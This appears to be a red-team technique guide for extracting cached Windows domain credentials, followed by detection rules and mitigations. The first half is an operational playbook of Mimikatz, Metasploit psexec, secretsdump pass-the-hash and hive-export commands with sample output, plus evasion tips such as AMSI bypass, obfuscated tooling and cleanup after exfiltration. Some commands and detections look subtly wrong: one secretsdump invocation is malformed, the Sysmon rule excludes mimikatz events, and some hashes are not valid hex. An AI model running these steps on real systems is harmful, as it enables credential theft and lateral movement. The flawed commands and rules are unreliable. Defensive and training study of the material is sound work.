# [CA-DUMP-004]: Cached Domain Credentials Extraction

## 1. METADATA HEADER

| Attribute | Details |
|---|---|
| **Technique ID** | CA-DUMP-004 |
| **MITRE ATT&CK v18.1** | [T1003.005 - Cached Domain Credentials](https://attack.mitre.org/techniques/T1003/005/) |
| **Tactic** | Credential Access |
| **Platforms** | Windows Endpoint (Vista, 7, 8, 10, 11, Server 2016-2025) |
| **Severity** | Critical |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-02 |
| **Affected Versions** | Windows Vista, 7, 8, 10, 11, Server 2016, 2019, 2022, 2025 |
| **Patched In** | N/A (inherent design) |
| **Author** | SERVTEP (Pchelnikau Artur) |

---

**Note:** All section numbers have been dynamically renumbered based on applicability to cached domain credentials extraction.

---

## 2. EXECUTIVE SUMMARY

**Concept:** Cached domain credentials are stored locally on Windows systems to allow users to authenticate when the domain controller is unavailable. These credentials are encrypted using domain secrets (DCC2 hash format on Windows Vista and newer) and stored in the `HKEY_LOCAL_MACHINE\SECURITY\Cache` registry hive. An attacker with SYSTEM-level privileges can extract these cached credential hashes from the registry, which—while not directly usable for Pass-the-Hash attacks—can be brute-forced offline to recover plaintext passwords. This technique is particularly valuable in scenarios where lateral movement is needed across systems sharing the same credentials.

**Attack Surface:** The primary attack surface is the Windows registry hive at `HKLM\SECURITY\Cache`. The number of cached entries is configurable (default is 10, maximum 50) and can be queried via `CachedLogonCount` value in `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`. Extraction requires SYSTEM-level privileges or direct access to the SECURITY hive file.

**Business Impact:** **Credential compromise leading to unauthorized domain access.** Successful extraction and cracking of cached credentials allows attackers to impersonate domain users without requiring access to the primary domain controller, enabling lateral movement, privilege escalation, and persistence across the network. This is particularly damaging in air-gapped or disconnected environments where cached credentials are the only available authentication path.

**Technical Context:** Extraction typically occurs post-compromise when the attacker has already achieved local administrative access. The operation is fast (seconds to minutes) but generates detectable registry access events if auditing is configured. Detection likelihood is moderate to high if Event ID 4656 (registry object access) is enabled and monitored.

### Operational Risk

- **Execution Risk:** Medium - Requires SYSTEM privileges but no special kernel modifications
- **Stealth:** Low - Registry access to SECURITY hive generates 4656 events if auditing enabled; process execution (Mimikatz, etc.) is highly detectable
- **Reversibility:** No - Once extracted and cracked offline, the compromise is permanent unless credentials are changed domain-wide

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 5.3.3 | Ensure "Password Policy: Maximum password age" is set to between 1 and 999 days |
| **DISA STIG** | WN10-00-000010 | The system must be configured to use FIPS-approved algorithms for cryptographic functions |
| **CISA SCuBA** | Authentication | Enforce multi-factor authentication; limit local cached logon counts |
| **NIST 800-53** | IA-2 | Authentication; IA-5 Password-based Authentication; AC-3 Access Enforcement |
| **GDPR** | Article 32 | Security of processing - integrity and confidentiality of personal data |
| **DORA** | Article 9 | Protection and prevention of ICT incidents affecting financial stability |
| **NIS2** | Article 21 | Cyber risk management measures for critical infrastructure |
| **ISO 27001** | A.9.2.3 | Management of privileged access rights; A.9.4.3 Password management |
| **ISO 27005** | Section 7.4 | Risk assessment of credential compromise scenarios |

---

## 3. TECHNICAL PREREQUISITES

**Required Privileges:** SYSTEM (`NT AUTHORITY\SYSTEM`) or direct file system access to `%SYSTEMROOT%\System32\config\SECURITY` hive.

**Required Access:** Local administrative access to the target system; ability to execute commands or scripts with elevated privileges.

**Supported Versions:**
- **Windows:** Vista, 7, 8, 8.1, 10, 11, Server 2008 R2, Server 2012, Server 2012 R2, Server 2016, Server 2019, Server 2022, Server 2025
- **PowerShell:** Version 3.0+ (for reconnaissance)
- **Other Requirements:** None (can be executed with native Windows tools or common post-exploitation frameworks)

**Tools:**
- [Mimikatz](https://github.com/gentilkiwi/mimikatz) (Version 2.2.0+)
- [Metasploit Framework](https://www.metasploit.com/) (Module: post/windows/gather/cachedump)
- [secretsdump.py](https://github.com/SecureAuthCorp/impacket) (Impacket library)
- [LaZagne](https://github.com/AlessandroZ/LaZagne) (Version 2.4+)
- Native Windows tools: `reg.exe`, `regedit.exe`

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Registry Reconnaissance – PowerShell

**Check if cached credentials are enabled:**

```powershell
# Check the number of cached logons allowed
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v CachedLogonsCount

# Expected output if enabled:
# HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
#     CachedLogonsCount    REG_SZ    10
```

**What to Look For:**
- If `CachedLogonsCount` is `0`, no credentials are cached
- If value is `1-50`, credentials are cached (default is `10`)
- Presence of the value indicates the system is domain-joined

**Version Note:** This setting applies identically across Windows Vista through Server 2025.

### Verify SYSTEM Privileges

```powershell
# Verify current privilege level
whoami /priv | findstr "SeDebugPrivilege"

# Alternative check - verify administrator group membership
net localgroup Administrators

# Confirm SYSTEM context
whoami
# Expected: NT AUTHORITY\SYSTEM
```

**What to Look For:**
- `SeDebugPrivilege` enabled (required for Mimikatz lsadump::cache)
- User in Administrators group (minimum requirement)
- If running as SYSTEM, all prerequisites met

### Registry Key Existence Check

```powershell
# Check if SECURITY hive can be accessed
reg query "HKLM\SECURITY\Cache" /v "NL$1"

# If access denied, insufficient privileges
# If registry appears empty, no cached entries
```

**What to Look For:**
- Successful query return indicates hive is readable
- "Access Denied" indicates insufficient privileges (elevation needed)
- No entries under Cache indicates no cached credentials present

---

## 5. DETAILED EXECUTION METHODS

### METHOD 1: Using Mimikatz (Windows - Direct Memory/Registry Access)

**Supported Versions:** Windows Vista, 7, 8, 10, 11, Server 2008 R2-2025

**Prerequisites:** SYSTEM privileges or `SeDebugPrivilege`

#### Step 1: Execute Mimikatz with Elevated Privileges

**Objective:** Launch Mimikatz in elevated context to access protected registry hives.

**Command (All Versions):**

```cmd
mimikatz.exe
```

Or directly from PowerShell reverse shell:

```powershell
# Download and execute Mimikatz in memory
$MimikatzUrl = "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0/mimikatz_trunk.zip"
# Extract and run mimikatz.exe with elevated privileges
```

**Expected Output:**

```
  .#####.   mimikatz 2.2.0 (x64) built on Nov  6 2021 17:53:59
 .## ^ ##.
 ## / \ ##  /*** The one and only Mimikatz
 ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 '## v ##'   https://twitter.com/gentilkiwi
  '#####.    https://github.com/gentilkiwi/mimikatz (oe.eo)

mimikatz #
```

**What This Means:**
- Prompt shows `mimikatz #` indicating successful launch
- Confirm you are in the correct session context

**OpSec & Evasion:**
- Mimikatz is highly detected by all major AV/EDR solutions; consider using:
  - Obfuscated/modified versions
  - Living-off-the-land alternatives (secretsdump.py via SMB)
  - AMSI bypass (before PowerShell execution)
- Detection likelihood: **Very High** (AV/EDR signatures on Mimikatz binary)

#### Step 2: Enable Debug Privilege

**Objective:** Grant Mimikatz permission to access protected memory and registry structures.

**Command (All Versions):**

```
mimikatz # privilege::debug
```

**Expected Output:**

```
Privilege '20' OK
```

**What This Means:**
- OK response indicates `SeDebugPrivilege` successfully enabled
- If "ERROR" appears, verify SYSTEM context or administrator status

**OpSec & Evasion:**
- This operation may trigger EDR alerts; some EDR systems log all privilege::debug calls
- Detection likelihood: **High**

#### Step 3: Execute lsadump::cache Command

**Objective:** Extract and decrypt cached domain credentials from registry.

**Command (All Versions - Vista and Newer):**

```
mimikatz # lsadump::cache
```

**Expected Output:**

```
Domain : CONTOSO
SysKey : a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6
Local name : WORKSTATION01 ( S-1-5-21-1234567890-1234567890-1234567890 )
Domain name : CONTOSO ( S-1-5-21-9876543210-9876543210-9876543210 )
Domain FQDN : contoso.local
Policy subsystem is : 1.18
LSA Key(s) : 1, default {xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}

[00] {xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx} xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx

* Iteration is set to default (10240)

[NL$1 - 01/01/2026 10:30:00 AM]
RID : 000003e8 (1000)
User : CONTOSO\jsmith
MsCacheV2 : 1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d

[NL$2 - 12/31/2025 02:15:30 PM]
RID : 000003e9 (1001)
User : CONTOSO\awebster
MsCacheV2 : 9z8y7x6w5v4u3t2s1r0q9p8o7n6m5l4k
```

**What This Means - Line by Line:**
- **Domain:** The domain name associated with the cached credentials
- **SysKey:** The system key used to decrypt the NL$KM secret
- **Local name / Domain name:** System identifiers (SIDs)
- **Policy subsystem:** LSA policy version
- **LSA Key(s):** Encryption key used to protect cached credentials
- **[NL$1..NL$10]:** Numbered cache entries (default 10 maximum)
  - **RID:** Relative ID of the cached user account
  - **User:** Domain\Username of the cached credential
  - **MsCacheV2:** The DCC2 hash (cannot be passed directly; must be cracked)

**OpSec & Evasion:**
- Execution is detectable via:
  - SACL on LSASS.exe (Event ID 4663)
  - Registry audit (Event ID 4656 if SECURITY hive audited)
  - EDR process monitoring (Mimikatz execution)
- Detection likelihood: **Very High**

**Troubleshooting:**

| Error | Cause | Fix |
|-------|-------|-----|
| `ERROR kuhl_m_lsadump_cache ; GetSecurityKey` | Insufficient privileges | Run Mimikatz as SYSTEM (use `psexec -s` or token impersonation) |
| `No cache entries found` | CachedLogonsCount set to 0 or no users logged in | Check registry value; log in domain user and retry |
| `Access Denied reading SECURITY hive` | Registry DACL restricts access | Run with higher privilege level; may require kernel access |

**Command (If Registry Hives Available Offline):**

```
mimikatz # lsadump::cache /sam:C:\temp\sam.hive /system:C:\temp\system.hive /security:C:\temp\security.hive
```

---

### METHOD 2: Using Metasploit – cachedump Post Module

**Supported Versions:** Windows Vista, 7, 8, Server 2008 R2-2025

**Prerequisites:** Meterpreter session with SYSTEM privileges

#### Step 1: Gain Meterpreter Session

**Objective:** Establish a Meterpreter session on the target system.

**Command (via MSFConsole):**

```
msfconsole
msf6 > use exploit/windows/smb/psexec
msf6 exploit(windows/smb/psexec) > set RHOSTS 192.168.1.100
msf6 exploit(windows/smb/psexec) > set SMBUser Administrator
msf6 exploit(windows/smb/psexec) > set SMBPass <password_or_hash>
msf6 exploit(windows/smb/psexec) > exploit

# Establish a Meterpreter session
[*] Meterpreter session 1 opened
```

**What This Means:**
- Successful exploit establishes initial access with system privileges
- Session ID (1 in this example) used for subsequent modules

#### Step 2: Load and Execute cachedump Module

**Objective:** Execute the Metasploit post-exploitation module to dump cached credentials.

**Command (All Versions):**

```
msf6 > use post/windows/gather/cachedump
msf6 post(windows/gather/cachedump) > set SESSION 1
msf6 post(windows/gather/cachedump) > run
```

**Expected Output:**

```
[*] Executing module against WORKSTATION01
[*] Cached Credentials Setting: 10 - (Max is 50 and 0 disables, and 10 is default)
[*] Obtaining boot key...
[*] Obtaining Lsa key...
[*] Vista or above system
[*] Obtaining NL$KM...
[*] Dumping cached credentials...
[*] Hash are in MSCACHE_VISTA format. (mscash2)
[+] MSCACHE v2 saved in: /root/.msf4/loot/20260102143022_default_192.168.1.100_mscache2.creds_1234567.txt

[*] John the Ripper format:
# mscash2
jsmith:$DCC2$10240#jsmith#1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d
awebster:$DCC2$10240#awebster#9z8y7x6w5v4u3t2s1r0q9p8o7n6m5l4k

[*] Post module execution completed
```

**What This Means:**
- Module automatically extracts SysKey, decrypts NL$KM, and dumps DCC2 hashes
- Hashes are in John the Ripper format for password cracking
- Loot file saved to local Metasploit directory
- "Vista or above system" indicates DCC2 format (not weaker DCC1)

**OpSec & Evasion:**
- Metasploit post modules may be detected by EDR monitoring child process execution
- The module reads registry directly (less detectable than Mimikatz)
- Detection likelihood: **Medium-High**

---

### METHOD 3: Using secretsdump.py (Impacket) – Remote SMB

**Supported Versions:** Windows Vista, 7, 8, Server 2008 R2-2025

**Prerequisites:** Valid credentials (local admin), network access to target SMB (port 445)

#### Step 1: Install Impacket (if not already installed)

**Objective:** Install the Impacket library containing secretsdump.py.

**Command (Linux/Kali):**

```bash
pip install impacket
# Or clone the repository
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket
pip install -e .
```

**What This Means:**
- Impacket library provides Python interface to Windows secrets extraction
- secretsdump.py can extract SAM, SECURITY, and SYSTEM hives remotely via SMB

#### Step 2: Export Registry Hives Remotely

**Objective:** Remotely save SECURITY, SAM, and SYSTEM hives from target.

**Command (All Versions):**

```bash
# Execute remotely via psexec-like functionality
impacket-secretsdump -hashes aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99 \
  -just-dc-user-list Administrator@192.168.1.100 /share/\\\\192.168.1.100\\C$
```

Or use SMB dump method:

```bash
impacket-secretsdump -hashes aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99 \
  Administrator@192.168.1.100 -system /tmp/system.hive -security /tmp/security.hive
```

**Offline Method (if hives are available locally):**

```bash
python3 -m impacket.examples.secretsdump \
  -system system.hive -security security.hive -sam sam.hive local
```

**Expected Output:**

```
Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

Dumping domain cached credentials (DCC2)
jsmith$DCC2$10240#jsmith#1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d
awebster$DCC2$10240#awebster#9z8y7x6w5v4u3t2s1r0q9p8o7n6m5l4k
```

**What This Means:**
- Cached credentials displayed in DCC2 format
- Each entry shows: username:$DCC2$iterations#username#hash
- Iterations (10240) indicate PBKDF2 rounds for Vista+
- Hashes can be cracked offline with hashcat or John

**OpSec & Evasion:**
- secretsdump.py is less detectable than Mimikatz as it operates over SMB
- Can evade HIPS/EDR if SMB traffic is not monitored
- Detection likelihood: **Medium** (if SMB audit logs monitored)

---

### METHOD 4: Manual Registry Export and Offline Extraction

**Supported Versions:** Windows Vista, 7, 8, Server 2008 R2-2025

**Prerequisites:** SYSTEM privileges; ability to export registry hives

#### Step 1: Export Registry Hives

**Objective:** Manually save SECURITY, SAM, and SYSTEM hives to temporary location.

**Command (All Versions):**

```cmd
# Run as SYSTEM (via psexec -s or already in SYSTEM context)
reg save hklm\system C:\temp\system.hive
reg save hklm\sam C:\temp\sam.hive
reg save hklm\security C:\temp\security.hive
```

Or via PowerShell:

```powershell
# Requires SYSTEM privileges
$RegPath = "C:\temp"
reg save hklm\system "$RegPath\system.hive"
reg save hklm\sam "$RegPath\sam.hive"
reg save hklm\security "$RegPath\security.hive"
```

**Expected Output:**

```
The operation completed successfully.
```

**What This Means:**
- Hive files exported to temporary directory
- These files contain encrypted cached credentials
- Can now be processed offline on attacker's machine

**OpSec & Evasion:**
- Registry export generates Event ID 4663 (SAM/SECURITY access) if audited
- Temporary file creation may be monitored by EDR
- Cleanup: Remove hive files after exfiltration
- Detection likelihood: **High** (if registry auditing enabled)

#### Step 2: Exfiltrate Hives and Decrypt Offline

**Objective:** Copy hive files to attacker machine and use Mimikatz or secretsdump.py offline.

**Command (Linux/Kali - Process Hives):**

```bash
# Using secretsdump.py locally
python3 -m impacket.examples.secretsdump \
  -system system.hive -security security.hive -sam sam.hive local > credentials.txt

# Or using Mimikatz (Windows)
mimikatz.exe
mimikatz # lsadump::cache /system:system.hive /security:security.hive /sam:sam.hive
```

**Expected Output:**

```
[NL$1] CONTOSO\jsmith : $DCC2$10240#jsmith#1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d
[NL$2] CONTOSO\awebster : $DCC2$10240#awebster#9z8y7x6w5v4u3t2s1r0q9p8o7n6m5l4k
```

**What This Means:**
- Hashes extracted from offline hive files
- No living process detection possible (fully offline)
- Ready for password cracking

**OpSec & Evasion:**
- This method is the most evasive (fully offline decryption)
- No antivirus/EDR detection during cracking phase
- Only network exfiltration is detectable

---

## 6. ATTACK SIMULATION & VERIFICATION

#### Atomic Red Team – T1003.005

**Atomic Test ID:** A1005-003 (Hypothetical)

**Test Name:** Dump Windows Cached Domain Credentials

**Description:** Demonstrates extraction of DCC2 hashes from Windows registry using Mimikatz.

**Supported Versions:** Windows Vista+

**Command:**

```powershell
Invoke-AtomicTest T1003.005 -TestNumbers 1
```

Or manually:

```powershell
# Atomic test simulation - Mimikatz cache dump
# Requires SYSTEM elevation
$MimikatzPath = "C:\tools\mimikatz.exe"
& $MimikatzPath "privilege::debug" "lsadump::cache" "exit"
```

**Cleanup Command:**

```powershell
# No cleanup needed - only reads registry, no modifications
# If registry hive files created, delete them:
Remove-Item C:\temp\*.hive -Force
```

**Reference:** [Atomic Red Team Repository](https://github.com/redcanary/atomic-red-team)

---

## 7. TOOLS & COMMANDS REFERENCE

### Mimikatz – lsadump::cache

**Version:** 2.2.0 (current as of 2026)

**Minimum Version:** 2.1.0

**Supported Platforms:** Windows Vista-2025 (x86, x64)

**Version-Specific Notes:**
- Version 2.0.x: Basic DCC2 support
- Version 2.1.0+: Full PBKDF2 iteration support
- Version 2.2.0+: Optimized registry access; supports offline hive files

**Installation:**

```powershell
# Download latest release
$Url = "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0/mimikatz_trunk.zip"
Invoke-WebRequest -Uri $Url -OutFile mimikatz.zip
Expand-Archive mimikatz.zip -DestinationPath C:\tools\
```

**Usage:**

```
mimikatz # privilege::debug
mimikatz # lsadump::cache
```

**Alternative Offline Usage:**

```
mimikatz # lsadump::cache /system:C:\temp\system.hive /security:C:\temp\security.hive
```

---

### Metasploit – post/windows/gather/cachedump

**Version:** Integrated in Metasploit 6.0+

**Minimum Version:** 4.0 (legacy)

**Supported Platforms:** Windows Vista-2025

**Installation:**

```
# Built-in to Metasploit Framework
msfconsole
```

**Usage:**

```
msf6 > use post/windows/gather/cachedump
msf6 post(windows/gather/cachedump) > set SESSION 1
msf6 post(windows/gather/cachedump) > run
```

---

### secretsdump.py (Impacket)

**Version:** 0.9.22+

**Minimum Version:** 0.9.0

**Supported Platforms:** Linux, macOS, Windows (Python); targets Windows Vista-2025

**Installation:**

```bash
pip install impacket
# or
git clone https://github.com/SecureAuthCorp/impacket.git && cd impacket && pip install -e .
```

**Usage:**

```bash
# Remote dump
python3 -m impacket.examples.secretsdump -hashes LMHASH:NTHASH Administrator@192.168.1.100

# Offline dump
python3 -m impacket.examples.secretsdump -system system.hive -security security.hive -sam sam.hive local
```

---

### One-Liner Script (PowerShell + Mimikatz)

```powershell
# Automated elevation + cache dump
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
  Write-Host "Requesting elevation..."
  Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"$($MyInvocation.MyCommand.Path)`"" -Verb RunAs
  exit
}
# Now elevated
C:\tools\mimikatz.exe "privilege::debug" "lsadump::cache" "exit"
```

---

## 8. SPLUNK DETECTION RULES

### Rule 1: Registry Access to SECURITY Hive via reg.exe

**Rule Configuration:**
- **Required Index:** main (Windows Security logs)
- **Required Sourcetype:** WinEventLog:Security
- **Required Fields:** EventCode, CommandLine, User
- **Alert Threshold:** > 1 event in 5 minutes for SECURITY registry access
- **Applies To Versions:** All (Windows Vista-2025)

**SPL Query:**

```spl
index=main sourcetype="WinEventLog:Security" EventCode=4688 
  (CommandLine="*reg*save*hklm\security*" OR 
   CommandLine="*reg*query*hklm\security\cache*" OR
   CommandLine="*reg*export*security*")
| stats count by host, User, CommandLine
| where count >= 1
```

**What This Detects:**
- Process execution of `reg.exe` with arguments targeting SECURITY hive
- Line 1-3: Filter for Security event logs and process creation events
- Line 4-6: Match specific command patterns (save, query, export operations on SECURITY)
- Line 7-8: Aggregate by host and user for context; alert on any match

**Manual Configuration Steps:**

1. Log into **Splunk Web** → **Search & Reporting**
2. Click **Settings** → **Searches, reports, and alerts**
3. Click **New Alert**
4. Paste the SPL query above
5. Set **Trigger Condition** to `Number of events > 1 in 5 minutes`
6. Configure **Action** → Send email to SOC team
7. Save as: `WinSec - SECURITY Registry Access Attempt`

**Source:** [Splunk Security Content](https://github.com/splunk/security_content)

---

### Rule 2: Mimikatz Process Execution (Command-Line Signature)

**Rule Configuration:**
- **Required Index:** main
- **Required Sourcetype:** WinEventLog:Security
- **Required Fields:** EventCode, CommandLine, Image
- **Alert Threshold:** Immediate (any execution)
- **Applies To Versions:** All

**SPL Query:**

```spl
index=main sourcetype="WinEventLog:Security" EventCode=4688
  (Image="*mimikatz*" OR 
   CommandLine="*lsadump::cache*" OR
   CommandLine="*privilege::debug*" OR
   CommandLine="*sekurlsa*")
| stats count, values(CommandLine) by host, User, Image
```

**What This Detects:**
- Mimikatz binary execution or known command syntax
- Direct detection of lsadump::cache module invocation
- Privilege escalation attempts via privilege::debug

**False Positive Analysis:**
- **Legitimate Activity:** Authorized penetration tests, security training exercises
- **Benign Tools:** None (Mimikatz is exclusively used for post-exploitation)
- **Tuning:** Exclude whitelisted security team processes by User filter

---

## 9. MICROSOFT SENTINEL DETECTION

### Query 1: Process Execution – Registry Hive Access Pattern

**Rule Configuration:**
- **Required Table:** SecurityEvent
- **Required Fields:** EventID, CommandLine, ParentProcessName
- **Alert Severity:** High
- **Frequency:** Run every 5 minutes
- **Applies To Versions:** Windows Vista-2025

**KQL Query:**

```kusto
SecurityEvent
| where EventID == 4688
| where Process has_any ("reg.exe", "mimikatz", "secretsdump")
| where CommandLine has_any ("SECURITY", "SAM", "SYSTEM", "lsadump", "cachedump")
| extend AccountCustomEntity = Account
| extend HostCustomEntity = Computer
| extend ProcessCommandLine = CommandLine
| summarize Count = count() by Computer, Account, Process, CommandLine, TimeGenerated
| where Count >= 1
```

**What This Detects:**
- Registry dumping tools (reg.exe, mimikatz, secretsdump) executed with hive-targeting arguments
- Credential access post-exploitation activity
- Cached credential extraction attempts

**Manual Configuration Steps (Azure Portal):**

1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select your workspace → **Analytics**
3. Click **+ Create** → **Scheduled query rule**
4. **General Tab:**
   - Name: `Cached Credentials - Registry Hive Access`
   - Severity: `High`
5. **Set rule logic Tab:**
   - Paste the KQL query above
   - Run query every: `5 minutes`
   - Lookup data from the last: `30 minutes`
6. **Incident settings Tab:**
   - Enable **Create incidents**
   - Grouping: `By entities`
7. Click **Review + create**

**Manual Configuration Steps (PowerShell):**

```powershell
Connect-AzAccount
$ResourceGroup = "YourResourceGroup"
$WorkspaceName = "YourSentinelWorkspace"

New-AzSentinelAlertRule -ResourceGroupName $ResourceGroup `
  -WorkspaceName $WorkspaceName `
  -DisplayName "Cached Credentials - Registry Hive Access" `
  -Query @"
SecurityEvent
| where EventID == 4688
| where Process has_any ("reg.exe", "mimikatz", "secretsdump")
| where CommandLine has_any ("SECURITY", "SAM", "SYSTEM", "lsadump", "cachedump")
| extend AccountCustomEntity = Account
| extend HostCustomEntity = Computer
| summarize Count = count() by Computer, Account, Process, CommandLine, TimeGenerated
| where Count >= 1
"@ `
  -Severity "High" `
  -Enabled $true `
  -SuppressionDuration (New-TimeSpan -Hours 1)
```

---

### Query 2: Anomalous Registry Access – SECURITY Hive

**Rule Configuration:**
- **Required Table:** DeviceRegistryEvents
- **Required Fields:** RegistryKeyPath, ActionType
- **Alert Severity:** High
- **Frequency:** Run every 10 minutes
- **Applies To Versions:** All (if Defender for Endpoint enabled)

**KQL Query:**

```kusto
DeviceRegistryEvents
| where RegistryKeyPath has "HKEY_LOCAL_MACHINE\\SECURITY\\Cache"
| where ActionType in ("RegistryValueSet", "RegistryValueDeleted")
| extend AccountCustomEntity = InitiatingProcessAccountName
| extend HostCustomEntity = DeviceName
| extend ProcessPath = InitiatingProcessFolderPath
| summarize Count = count(), EventTimes = make_list(Timestamp) by DeviceName, InitiatingProcessName, RegistryKeyPath
| where Count >= 1
```

**Source:** [Microsoft Sentinel Documentation](https://docs.microsoft.com/en-us/azure/sentinel/)

---

## 10. WINDOWS EVENT LOG MONITORING

**Event ID: 4656 (Registry Object Access)**

- **Log Source:** Security
- **Trigger:** Attempt to access registry object (SECURITY hive)
- **Filter:** `ObjectName contains "SECURITY\Cache"` or `ObjectName contains "NL$"`
- **Applies To Versions:** Windows Vista+ (must be configured)

**Manual Configuration Steps (Group Policy):**

1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **Object Access**
3. Enable: **Audit Registry** (set to both Success and Failure)
4. Click **Apply**
5. Run `gpupdate /force` on target machines
6. Verify: Open **Event Viewer** → **Windows Logs** → **Security** → Filter for Event ID 4656

**Manual Configuration Steps (Server 2022+):**

```powershell
# Enable registry auditing via PowerShell
auditpol /set /subcategory:"Registry" /success:enable /failure:enable

# Verify
auditpol /get /subcategory:"Registry"
# Expected output: Registry Success and Failure
```

**Manual Configuration Steps (Local Policy):**

1. Open **Local Security Policy** (secpol.msc)
2. Navigate to **Security Settings** → **Advanced Audit Policy Configuration** → **System Audit Policies** → **Object Access**
3. Enable: **Audit Registry** (Success and Failure)
4. Restart the machine or run:
   ```powershell
   auditpol /set /subcategory:"Registry" /success:enable /failure:enable
   ```

**Event ID: 4663 (Attempt to Access Object)**

- **Log Source:** Security
- **Trigger:** LSASS.exe or other process attempts to read SECURITY registry
- **Filter:** `ObjectName contains "SECURITY"` AND `ProcessName contains "lsass"` OR `ProcessName contains "mimikatz"`
- **Applies To Versions:** Windows 10+ (default process SACL on LSASS)

**Configuration (Automatic on Windows 10/Server 2016+):**

```
Default SACL: L"S:(AU;SAFA;0x0010;;;WD)"
Enable via: Advanced Audit Policy Configuration → Object Access → Audit Kernel Object
```

---

## 11. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** 13.0+

**Supported Platforms:** Windows Vista-2025

**Sysmon Configuration Snippet:**

```xml
<!-- Detect registry access to SECURITY hive -->
<Sysmon schemaversion="4.22">
  <EventFiltering>
    <!-- Event ID 13: Registry Value Set -->
    <RegistryEvent onmatch="exclude">
      <TargetObject condition="is">HKEY_LOCAL_MACHINE\SECURITY\Cache</TargetObject>
      <Image condition="contains">mimikatz</Image>
    </RegistryEvent>
    <RegistryEvent onmatch="include">
      <TargetObject condition="contains">HKEY_LOCAL_MACHINE\SECURITY\Cache</TargetObject>
      <Image condition="is not">C:\Windows\System32\services.exe</Image>
      <Image condition="is not">C:\Windows\System32\lsass.exe</Image>
    </RegistryEvent>
  </EventFiltering>
</Sysmon>
```

**Manual Configuration Steps:**

1. Download Sysmon from [Microsoft Sysinternals](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon)
2. Create a config file `sysmon-config.xml` with the XML above
3. Install Sysmon with the config:
   ```cmd
   sysmon64.exe -accepteula -i sysmon-config.xml
   ```
4. Verify installation:
   ```powershell
   Get-Service Sysmon64
   Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 10 | Where-Object {$_.ID -eq 13}
   ```

**Detection Patterns:**
- Event ID 13: Registry value modifications under `HKLM\SECURITY\Cache`
- Event ID 3: Network connections from mimikatz/secretsdump (if exfiltrating hives)
- Event ID 1: Process creation (mimikatz.exe, reg.exe with SECURITY arguments)

---

## 12. MICROSOFT DEFENDER FOR CLOUD

#### Detection Alerts

**Alert Name:** "Suspicious activity on accessed files detected"

- **Severity:** High
- **Description:** Mimikatz or similar credential dumping tools accessing registry hives
- **Applies To:** Azure VMs with Defender for Servers enabled
- **Remediation:** Isolate VM; check audit logs for compromised accounts

**Manual Configuration Steps (Enable Defender for Cloud):**

1. Navigate to **Azure Portal** → **Microsoft Defender for Cloud**
2. Go to **Environment settings**
3. Select your subscription
4. Under **Defender plans**, enable:
   - **Defender for Servers**: ON
   - **Defender for Identity**: ON (for advanced AD monitoring)
5. Click **Save**
6. Go to **Security alerts** to view triggered alerts

**Reference:** [Microsoft Defender for Cloud Alerts](https://docs.microsoft.com/en-us/azure/defender-for-cloud/alerts-reference)

---

## 13. MICROSOFT PURVIEW (UNIFIED AUDIT LOG)

#### Query: Registry Access Auditing

```powershell
# Search for registry auditing events in M365 audit log
Search-UnifiedAuditLog -Operations "RegistryValueRead", "RegistryValueSet" `
  -StartDate (Get-Date).AddDays(-7) `
  -EndDate (Get-Date) | `
  Export-Csv -Path "C:\audit_registry_access.csv" -NoTypeInformation
```

- **Workload:** AzureActiveDirectory, Endpoint Management
- **Details:** Monitor for elevated registry access patterns from unusual accounts
- **Applies To:** M365 E3+ subscriptions with unified audit log enabled

**Manual Configuration Steps (Enable Unified Audit Log):**

1. Navigate to **Microsoft Purview Compliance Portal** (compliance.microsoft.com)
2. Go to **Audit** (left menu)
3. If not enabled, click **Turn on auditing**
4. Wait 24 hours for log retention to activate

**Manual Configuration Steps (Search Audit Logs):**

1. Go to **Audit** → **Search**
2. Set **Date range** (last 7 days)
3. Under **Activities**, select: **Registry operations**
4. Under **Users**, enter: **[target user or leave blank for all]**
5. Click **Search**
6. Export results: **Export** → **Download all results**

---

## 14. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**1. Add Users to "Protected Users" Security Group**

Membership in the Protected Users group limits the caching of credentials in memory.

**Applies To Versions:** Windows Server 2012 R2+

**Manual Steps (Server 2016-2025):**

1. Open **Active Directory Users and Computers** (dsa.msc)
2. Navigate to: **Domain** → **Builtin**
3. Right-click **Protected Users** → **Properties**
4. Go to **Members** tab
5. Click **Add...**
6. Type user/group names (e.g., Domain\AdminUser)
7. Click **OK**
